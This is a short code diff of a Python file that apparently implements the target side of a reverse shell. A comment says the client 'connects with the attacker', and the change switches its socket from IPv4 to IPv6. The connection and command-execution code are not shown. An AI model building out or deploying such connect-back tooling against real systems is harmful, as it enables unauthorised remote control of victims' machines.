@@ -3,7 +3,7 @@ import subprocess
 import os
 
 BUFFER_SIZE = 1024
-target_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+target_client = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
 
 # connects with the attacker 
 def target_client_connector():
